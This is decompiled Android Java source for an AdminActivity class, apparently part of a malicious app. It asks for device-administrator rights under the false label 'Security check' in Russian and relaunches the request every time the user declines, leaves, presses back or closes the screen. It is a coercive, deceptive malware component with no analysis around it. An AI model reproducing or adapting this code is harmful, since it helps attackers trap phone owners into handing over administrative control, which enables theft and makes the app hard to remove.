package com.address.core;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;

public class AdminActivity extends Activity {
    public static Boolean isAdmin = Boolean.valueOf(false);

    public void Launch(Boolean newtask) {
        Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
        intent.putExtra("android.app.extra.DEVICE_ADMIN", new ComponentName(RunService.getService(), AdminReceiver.class));
        intent.putExtra("android.app.extra.ADD_EXPLANATION", "Проверка безопасности");
        if (newtask.booleanValue()) {
            intent.addFlags(268435456);
        }
        startActivityForResult(intent, 111);
    }

    /* access modifiers changed from: protected */
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode != 111) {
            return;
        }
        if (resultCode == -1) {
            isAdmin = Boolean.valueOf(true);
            finish();
            return;
        }
        isAdmin = Boolean.valueOf(false);
        Launch(Boolean.valueOf(true));
    }

    public void onCreate(Bundle icicle) {
        Launch(Boolean.valueOf(false));
        super.onCreate(icicle);
    }

    /* access modifiers changed from: protected */
    public void onStart() {
        super.onStart();
        Launch(Boolean.valueOf(false));
    }

    /* access modifiers changed from: protected */
    public void onPause() {
        RunService.getService();
        RunService.onTickHandler.sendEmptyMessageDelayed(111, 2000);
        super.onPause();
        Launch(Boolean.valueOf(true));
    }

    public void onBackPressed() {
        super.onBackPressed();
        Launch(Boolean.valueOf(true));
    }

    /* access modifiers changed from: protected */
    public void onDestroy() {
        RunService.getService();
        RunService.onTickHandler.sendEmptyMessageDelayed(111, 2000);
        super.onDestroy();
        Launch(Boolean.valueOf(true));
    }
}
